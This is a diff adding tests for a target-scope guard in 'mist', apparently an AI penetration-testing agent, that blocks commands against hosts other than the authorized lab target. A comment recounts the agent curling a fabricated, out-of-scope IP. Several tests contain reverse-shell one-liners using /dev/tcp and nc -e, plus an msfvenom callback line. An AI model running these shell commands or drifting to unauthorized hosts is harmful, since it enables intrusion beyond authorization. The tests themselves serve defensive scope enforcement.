@@ -1014,6 +1014,64 @@ def test_browse_delegates_to_shell_with_a_render_command():
     assert "RENDERED" in out
 
 
+# -- target-scope guard (no drifting to an unauthorized host) -------------
+
+def test_scope_violation_blocks_recon_against_a_non_target_ip():
+    from mist.tools.registry import _scope_violation
+    # the actual incident: dead-ended on the target, then curled a fabricated IP
+    msg = _scope_violation("cd ~/x && curl -s http://10.10.11.238/robots.txt", "10.129.36.26")
+    assert msg is not None
+    assert "10.10.11.238" in msg and "10.129.36.26" in msg and "[blocked]" in msg
+    # a bare nmap at the wrong host too
+    assert _scope_violation("nmap -sV 10.10.11.238", "10.129.36.26") is not None
+
+
+def test_scope_violation_allows_the_authorized_target_and_hostnames():
+    from mist.tools.registry import _scope_violation
+    assert _scope_violation("curl http://10.129.36.26/index.html", "10.129.36.26") is None
+    assert _scope_violation("nmap -p- 10.129.36.26", "10.129.36.26") is None
+    # hostnames resolve to the target via /etc/hosts — never blocked
+    assert _scope_violation("curl http://enigma.htb/login", "10.129.36.26") is None
+    # no IP in the objective -> nothing to enforce against
+    assert _scope_violation("curl http://10.10.11.238/", None) is None
+
+
+def test_scope_violation_exempts_reverse_shell_and_loopback():
+    from mist.tools.registry import _scope_violation
+    # attacker callback IP (LHOST / /dev/tcp) is legitimately not the target
+    assert _scope_violation("bash -i >& /dev/tcp/10.10.14.9/4444 0>&1", "10.129.36.26") is None
+    assert _scope_violation("msfvenom -p x LHOST=10.10.14.9 LPORT=4444", "10.129.36.26") is None
+    assert _scope_violation("nc -e /bin/bash 10.10.14.9 4444", "10.129.36.26") is None
+    # loopback / local listeners are never a scope drift
+    assert _scope_violation("curl http://127.0.0.1:8080/", "10.129.36.26") is None
+
+
+def test_shell_tool_blocks_out_of_scope_target_and_still_runs_on_target():
+    tools = default_registry(remember_fn=lambda c: None, shell_config=None)
+    tools.workspace.target_ip = "10.129.36.26"
+    blocked = tools.get("shell").run(command="curl -s http://10.10.11.238/robots.txt")
+    assert blocked.startswith("[blocked]") and "10.10.11.238" in blocked
+    # a command with no foreign target still executes normally
+    assert "in-scope-ok" in tools.get("shell").run(command="echo in-scope-ok")
+
+
+def test_shell_scope_guard_off_when_target_scope_disabled():
+    from mist.config import SecurityConfig
+    tools = default_registry(remember_fn=lambda c: None, shell_config=None,
+                             security_config=SecurityConfig(target_scope_enforced=False))
+    tools.workspace.target_ip = "10.129.36.26"
+    # with the gate off, the drifting command is NOT blocked (it just runs/fails)
+    out = tools.get("shell").run(command="curl -s --max-time 1 http://10.10.11.238/")
+    assert not out.startswith("[blocked]")
+
+
+def test_browse_to_out_of_scope_ip_is_blocked_via_shell():
+    tools = default_registry(remember_fn=lambda c: None, shell_config=None)
+    tools.workspace.target_ip = "10.129.36.26"
+    out = tools.get("browse").run(url="10.10.11.238")
+    assert out.startswith("[blocked]") and "10.10.11.238" in out
+
+
 def test_shell_ssh_backend_builds_correct_command(monkeypatch):
     captured = {}
 
